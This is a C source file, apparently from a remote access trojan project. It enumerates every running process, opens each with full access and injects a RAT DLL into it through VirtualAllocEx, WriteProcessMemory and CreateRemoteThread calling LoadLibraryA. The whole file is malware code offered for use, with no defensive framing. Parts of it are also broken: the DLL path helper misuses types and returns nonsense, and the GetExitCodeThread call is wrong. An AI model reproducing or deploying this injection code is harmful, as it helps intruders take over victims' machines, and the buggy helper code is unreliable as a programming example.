
#include "RAT_MULTI_PROCESSES.h"

#define RET_PATH(__path) __path ? __path == NULL : __path == __path 
#define __MAX_PATH 1024

const char* __cdecl RAT_GET_DLL_PATH(__RAT_INJECT_INFORMATION* __dllpath)
{
	__dllpath = (__RAT_INJECT_INFORMATION*)malloc(sizeof(__dllpath->__DLL_PATH));
	if (__dllpath == NULL)
	{
		printf("Error to allocate memory for RAT_INJECT_INFORMATION");
		return -1;
	}
	return RET_PATH(__dllpath);
}


BOOL __cdecl __GETPRCLIST()
{

	const char* __RATDLL_PATH = RAT_GET_DLL_PATH("C:\\Users\\danie\\source\\repos\\ratlcps\\Debug\\ratlcps.dll");

	// For textcolor settings
	HANDLE _hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(_hStdout, FOREGROUND_GREEN);

	__RAT_INJECT_INFORMATION* RTRPCSINFO = (
		__RAT_INJECT_INFORMATION*)malloc(sizeof *RTRPCSINFO);
	if (RTRPCSINFO == NULL)
	{
		printf("Error to allocate memroy for RTRPCS\n");
		return -1;
	}

	RTRPCSINFO->__hPrcsSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (RTRPCSINFO->__hPrcsSnap == INVALID_HANDLE_VALUE)
	{
		printf("Error to CreateToolhelp32Snapshot()"); 
		return (FALSE); 
	}

	RTRPCSINFO->__PE32.dwSize = sizeof(PROCESSENTRY32); 

	if (!Process32First(RTRPCSINFO->__hPrcsSnap, &RTRPCSINFO->__PE32))
	{
		printf("Process32First"); 
		CloseHandle(RTRPCSINFO->__hPrcsSnap);
		return (FALSE); 
	}

	do
	{
		_tprintf(TEXT("\n\n ..................................................."));
		_tprintf(TEXT("\n\tPROCESS_NAME : %s"), RTRPCSINFO->__PE32.szExeFile);
		_tprintf(TEXT("\n\n ..................................................."));


		RTRPCSINFO->__dwPrioCls = 0;
		HANDLE PRCS = RTRPCSINFO->__hPrcs = OpenProcess(PROCESS_ALL_ACCESS, FALSE, RTRPCSINFO->__PE32.th32ProcessID);
		INJECTDLL_RAT(__RATDLL_PATH, PRCS);
		if (RTRPCSINFO->__hPrcs == NULL)
		{
			printf("\tPRC [+] \n");
		}
		else
		{
			RTRPCSINFO->__dwPrioCls = GetPriorityClass(RTRPCSINFO->__hPrcs);
			if (!RTRPCSINFO->__dwPrioCls)
			{
				printf("GetPriorityClass\n");
			}

			CloseHandle(RTRPCSINFO->__hPrcs);
		}

		_tprintf(TEXT("\n Process ID	= 0x%08X"), RTRPCSINFO->__PE32.th32ProcessID);
		_tprintf(TEXT("\n Thread count  = %d"), RTRPCSINFO->__PE32.cntThreads);
		_tprintf(TEXT("\n Parent prcs ID= 0x%08X"), RTRPCSINFO->__PE32.th32ParentProcessID);
		_tprintf(TEXT("\n Process Priority base	= %d"), RTRPCSINFO->__PE32.pcPriClassBase);
		if (!RTRPCSINFO->__dwPrioCls)
		{
			_tprintf(TEXT("\nPriority Class is : %d"), RTRPCSINFO->__dwPrioCls);
		}


	} while (Process32Next(RTRPCSINFO->__hPrcsSnap, &RTRPCSINFO->__PE32));


	CloseHandle(RTRPCSINFO->__hPrcsSnap);
	free(RTRPCSINFO);

	return (TRUE);
}

HANDLE __cdecl INJECTDLL_RAT(const char* __DLLPTH, HANDLE __PRCS)
{
	char __fulldllpth[__MAX_PATH];
	GetFullPathName(__DLLPTH, __MAX_PATH, __fulldllpth, NULL);
	
	LPVOID __DLL_PATHADDR = VirtualAllocEx(__PRCS, NULL, __MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(__PRCS, __DLL_PATHADDR, __fulldllpth, strlen(__fulldllpth), NULL);
	
	LPVOID __LOADLIBADDR = GetProcAddress(GetModuleHandle("Kernel32"), 
		"LoadLibraryA");

	HANDLE __HRTHREAD = CreateRemoteThread(__PRCS, NULL, 0,
		(LPTHREAD_START_ROUTINE)__LOADLIBADDR, __DLL_PATHADDR, 0, NULL);

	WaitForSingleObject(__HRTHREAD, INFINITE);
	
	DWORD __EXIT_CODE = 0;
	GetExitCodeThread(__HRTHREAD, __EXIT_CODE);

	CloseHandle(__HRTHREAD);
	VirtualFreeEx(__PRCS, __DLL_PATHADDR, 0, MEM_RELEASE);
	CloseHandle(__PRCS);

	return (HANDLE)__EXIT_CODE;
}